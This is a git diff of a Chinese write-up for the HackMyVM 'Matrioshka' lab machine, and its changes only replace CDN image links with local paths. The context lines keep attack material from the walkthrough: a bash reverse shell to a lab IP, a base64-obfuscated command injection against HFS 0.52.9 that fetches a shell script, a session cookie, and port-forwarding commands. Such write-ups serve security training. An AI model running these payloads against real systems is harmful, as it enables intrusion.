@@ -10,7 +10,7 @@ tags:
   - Linux Machine
 ---
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769168212713-0e4e6130-698a-4d68-914c-653ae08b29de.png)
+![](/image/hmvmachines/Matrioshka-1.png)
 
 # 信息收集
 ## IP定位
@@ -806,7 +806,7 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.108/4444 0>&1'")
   adding: rev.php (deflated 14%)
 ```
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769219910255-97006157-f632-49e3-996f-86fcfb8d5280.png)
+![](/image/hmvmachines/Matrioshka-2.png)
 
 ```plain
 (remote) www-data@3ed5ddfe0e0c:/home$ env
@@ -1066,13 +1066,13 @@ curl -v http://127.0.0.1:9090
 ssh -L 7777:127.0.0.1:9090 matrioshka@192.168.0.105
 ```
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769221019575-29f54b71-f3ae-49b0-a286-ca745773feef.png)
+![](/image/hmvmachines/Matrioshka-3.png)
 
  尝试利用弱密码去登录，发现凭证就是`admin:admin`
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769221331699-6ee43ab6-e82c-4dbb-8d2b-4a96726ffce9.png)
+![](/image/hmvmachines/Matrioshka-4.png)
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769221348298-87c705c7-775b-4efc-b407-c084809dacca.png)
+![](/image/hmvmachines/Matrioshka-5.png)
 
 得知文件服务器是`HFS 0.52.9`版本
 
@@ -1546,13 +1546,13 @@ print("="*60)
 ```
 
 ## 订正
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769256773738-b73e6a00-19e3-4fe0-8873-ba2a06e6a96b.png)
+![](/image/hmvmachines/Matrioshka-6.png)
 
 ```plain
 hfs_http.sig=f_Q0EvPGzGSWmyCQtHd_gplkGgg;hfs_http=eyJ1c2VybmFtZSI6ImFkbWluIiwiaXAiOiIxNzIuMTkuMC4xIiwiX2V4cGlyZSI6MTc2OTMzOTcyMjM2OSwiX21heEFnZSI6ODY0MDAwMDB9
 ```
 
-运行poc后发现/tmp目录下创建文件![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769253474830-54d7152e-2122-401c-b4e4-390127fd928e.png)
+运行poc后发现/tmp目录下创建文件![](/image/hmvmachines/Matrioshka-7.png)
 
 ```plain
 127.0.0.1:7777/~/api/get_ls?path=/tmp/poc";python3 -c "import os;import base64;os.system(base64.b64decode('d2dldCAxNzIuMTkuMC4xOjgwMDAvcmV2ZXJzZV9zaGVsbC5zaCAtTyAvdG1wL3Jldi5zaAo=
@@ -1615,13 +1615,13 @@ matrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:8000,fork TCP4:172.19.0.2:80 &
 
 先用脚本跑一个，跑出这个文件
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769257143055-fed224ee-8342-4f1f-830a-8aa67ae61948.png)
+![](/image/hmvmachines/Matrioshka-8.png)
 
 然后重命名这个base64代码
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769257194030-79f2005b-2811-4a50-86e0-a8257ef7d9ff.png)
+![](/image/hmvmachines/Matrioshka-9.png)
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1769257223844-db9b1991-788f-448f-8743-10f5b20df495.png)
+![](/image/hmvmachines/Matrioshka-10.png)
 
 然后复制粘贴
 
